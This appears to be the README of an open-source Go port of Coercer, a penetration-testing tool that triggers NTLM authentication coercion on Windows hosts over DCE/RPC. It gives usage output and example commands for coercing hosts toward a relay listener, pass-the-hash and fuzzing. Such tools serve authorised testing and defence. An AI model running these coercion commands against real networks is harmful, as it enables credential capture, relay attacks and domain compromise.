<p align="center">
      A tool to list, scan, fuzz, and trigger authentication coercion methods (MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP, MS-EVEN, MS-PAR) on remote Windows hosts over DCE/RPC.
      <br>
      <a href="https://github.com/TheManticoreProject/coercer/actions/workflows/release.yaml" title="Build"><img alt="Build and Release" src="https://github.com/TheManticoreProject/coercer/actions/workflows/release.yaml/badge.svg"></a>
      <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/TheManticoreProject/coercer">
      <img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/TheManticoreProject/manticore-coercer">
      <br>
</p>

## Features

- [x] 20 coercion methods across 6 RPC protocols:
  - MS-RPRN: `RpcRemoteFindFirstPrinterChangeNotification`, `RpcRemoteFindFirstPrinterChangeNotificationEx`
  - MS-EFSR: 12 methods, including `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`, `EfsRpcFileKeyInfoEx` and `EfsRpcEncryptFileExSrv`
  - MS-DFSNM, MS-FSRVP, MS-EVEN and MS-PAR (`RpcAsyncOpenPrinter`)
- [x] Four modes:
  - `list`: list the methods and their access paths, offline
  - `scan`: find the methods that work, using a built-in SMB or HTTP listener
  - `coerce`: trigger coercion toward an external listener (for example `ntlmrelayx`)
  - `fuzz`: try every exploit path and, optionally, every RPC auth type and level
- [x] Both transports: `ncacn_np` (SMB named pipes) and `ncacn_ip_tcp`, with endpoint-mapper port resolution or explicit `--dce-ports`.
- [x] Named-pipe enumeration in fuzz mode, with an anonymous fallback.
- [x] Authentication with a password, pass-the-hash, a null session, or Kerberos (`-k`, password, `--aes-key` or a ticket cache) for both DCE/RPC and the SMB named-pipe session.
- [x] SMB and WebDAV UNC paths (`--path-type smb|webdav`), with `--path-ip` to override the IP placed in the paths.
- [x] The built-in HTTP listener captures the NTLM challenge/response, on a fixed (`--http-port`) or random (`--min-http-port`/`--max-http-port`) port.
- [x] Filters by method, protocol, pipe and transport.
- [x] Results export to JSON, XLSX and SQLite.
- [x] Coercer-compatible aliases (`--filter-method-name`, `-f`) for use as a drop-in replacement.

## Installation

Prebuilt binaries for Linux, Windows and macOS are attached to every [release](https://github.com/TheManticoreProject/coercer/releases).

To build from source (Go 1.24 or later):

```
git clone https://github.com/TheManticoreProject/coercer
cd coercer
go build -o coercer .
```

## Usage

The first positional argument is the mode. Running the tool with no mode prints the list of available modes:

```
$ ./coercer
manticore-coercer - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0

Usage: coercer <coerce|fuzz|list|scan>

   coerce  Trigger authentication coercion to an external listener.
   fuzz    Fuzz exploit paths and auth levels against all methods.
   list    List available coercion methods and access paths.
   scan    Scan for vulnerable coercion methods with known exploit paths.
```

Each mode has its own options. For example, `coerce`:

```
$ ./coercer coerce
manticore-coercer - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0

Usage: coercer coerce [--domain <string>] [--username <string>] [--password <string>] [--hashes <string>] [--no-pass] [--kerberos] [--dc-ip <string>] [--aes-key <string>] --listener-ip <string> [--always-continue] [--debug] [--verbose] [--minimum-log-level <string>] [--log-file <string>] [--disable-escape-codes] [--smb-port <tcp port>] [--dce-port <tcp port>] [--http-port <tcp port>] [--min-http-port <tcp port>] [--max-http-port <tcp port>] [--dce-ports <int>] [--export-json <string>] [--export-xlsx <string>] [--export-sqlite <string>] [--filter-method <string>] [--filter-method-name <string>] [--filter-protocol <string>] [--filter-pipe <string>] [--filter-transport <string>] [--path-type <string>] [--path-ip <string>] [--target-ip <string>] [--targets-file <string>] [-f <string>] [--timeout <int>] [--delay <int>]


  Authentication:
    -d, --domain <string>   Active Directory domain to authenticate to. (default: "")
    -u, --username <string> User to authenticate as. (default: "")
    -p, --password <string> Password to authenticate with. (default: "")
    -H, --hashes <string>   NT/LM hashes, format is LMhash:NThash. (default: "")
    --no-pass               Do not ask for a password, bind without one. (default: false)
    -k, --kerberos          Use Kerberos authentication for RPC binds (target must be an FQDN). (default: false)
    --dc-ip <string>        KDC / domain controller address for Kerberos (default: resolve from domain). (default: "")
    --aes-key <string>      AES128/256 key for Kerberos (pass-the-key). (default: "")

  Coerce options:
    -l, --listener-ip <string> IP address of the external listener (e.g. ntlmrelayx).
    --always-continue          Skip interactive continue/skip/stop prompts. (default: false)

  Configuration:
    --debug                      Debug mode. (default: false)
    -v, --verbose                Verbose output (show debug-level detail). (default: false)
    --minimum-log-level <string> Minimum log level to emit: debug, info, warn or error. (default: "")
    --log-file <string>          Also write output (ANSI-stripped) to this log file. (default: "")
    --disable-escape-codes       Disable ANSI escape codes (colors) in output. (default: false)

  Connection:
    --smb-port <tcp port>      SMB port. (default: 445)
    --dce-port <tcp port>      DCERPC endpoint mapper port. (default: 135)
    --http-port <tcp port>     HTTP listener and exploit-path port. (default: 80)
    --min-http-port <tcp port> Low bound of a random HTTP listener port range (with --max-http-port). (default: 0)
    --max-http-port <tcp port> High bound of a random HTTP listener port range (with --min-http-port). (default: 0)
    --dce-ports <int>          Explicit DCERPC TCP ports to try (skips endpoint-mapper discovery).

  Export:
    --export-json <string>   Export results to JSON file. (default: "")
    --export-xlsx <string>   Export results to XLSX file. (default: "")
    --export-sqlite <string> Export results to SQLite database. (default: "")

  Filter:
    --filter-method <string>      Filter by method name.
    --filter-method-name <string> Alias of --filter-method (Coercer compatibility).
    --filter-protocol <string>    Filter by protocol name.
    --filter-pipe <string>        Filter by pipe name.
    --filter-transport <string>   Filter by transport (msrpc, dcerpc).
    --path-type <string>          Restrict generated UNC paths to smb or webdav (default: both). In scan/fuzz this narrows the listener's --auth-type. (default: "")

  Paths:
    --path-ip <string> IP to place in generated exploit paths (overrides the listener IP). (default: "")

  Target:
    -t, --target-ip <string>     Target host IP or hostname. (default: "")
    -tf, --targets-file <string> File with target hosts, one per line. (default: "")
    -f <string>                  Alias of --targets-file (Coercer compatibility). (default: "")

  Timeouts:
    --timeout <int> Connection timeout in seconds. (default: 10)

  Timing:
    --delay <int>   Delay between attempts in seconds. (default: 0)
```

`scan` and `fuzz` take the same groups, and add a `Listener` group in place of `--listener-ip`:

```
  Listener:
    -i, --listener-interface <string>  Network interface to listen on. (default: "")
    -I, --listener-ip-address <string> Explicit IP address for the listener. (default: "")
    --auth-type <string>               Auth type to capture: smb or http. (default: "smb")
```

`scan` adds `--stop-on-auth` (stop after the first authentication received per target). `fuzz` adds `--only-known-paths` (only fuzz known working exploit paths) and `--fuzz-auth` (fuzz RPC authentication type and level combinations).

Typical invocations:

```
# Find working methods on a host, capturing over SMB on this machine
./coercer scan -t 10.0.0.10 -d CORP.local -u user -p 'Password1' -I 10.0.0.5

# Coerce a host toward an external relay listener
./coercer coerce -t 10.0.0.10 -d CORP.local -u user -H :<NThash> -l 10.0.0.5 --always-continue

# Kerberos (target must be an FQDN)
./coercer scan -t dc01.CORP.local -d CORP.local -u user -p 'Password1' -k --dc-ip 10.0.0.10 -I 10.0.0.5

# Fuzz all paths and auth levels, export the results
./coercer fuzz -t 10.0.0.10 -d CORP.local -u user -p 'Password1' -I 10.0.0.5 --fuzz-auth --export-sqlite results.db
```

## Demonstration

Listing the MS-RPRN methods and their access paths (timestamps removed):

```
$ ./coercer list --filter-protocol MS-RPRN --disable-escape-codes
manticore-coercer - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0

INFO: Available coercion methods:

INFO:   MS-RPRN (Print System Remote) - 2 method(s)
INFO:     RpcRemoteFindFirstPrinterChangeNotification        opnum 62   [ncacn_np] pipe: \spoolss  auth: NTLM+PktPrivacy  (12345678-1234-abcd-ef00-0123456789ab v1.0)
INFO:     RpcRemoteFindFirstPrinterChangeNotification        opnum 62   [ncacn_ip_tcp]  auth: NTLM+PktPrivacy  (12345678-1234-abcd-ef00-0123456789ab v1.0)
INFO:     RpcRemoteFindFirstPrinterChangeNotificationEx      opnum 65   [ncacn_np] pipe: \spoolss  auth: NTLM+PktPrivacy  (12345678-1234-abcd-ef00-0123456789ab v1.0)
INFO:     RpcRemoteFindFirstPrinterChangeNotificationEx      opnum 65   [ncacn_ip_tcp]  auth: NTLM+PktPrivacy  (12345678-1234-abcd-ef00-0123456789ab v1.0)

INFO:   Total: 2 methods, 4 access paths across 1 protocols.
```

## Contributing

Pull requests are welcome. Feel free to open an issue if you want to add other features.

## Credits
  - [Remi GASCOU (Podalirius)](https://github.com/p0dalirius) for the creation of the original [Coercer](https://github.com/p0dalirius/Coercer) tool, of which this is a Go port built on [Manticore](https://github.com/TheManticoreProject/Manticore).
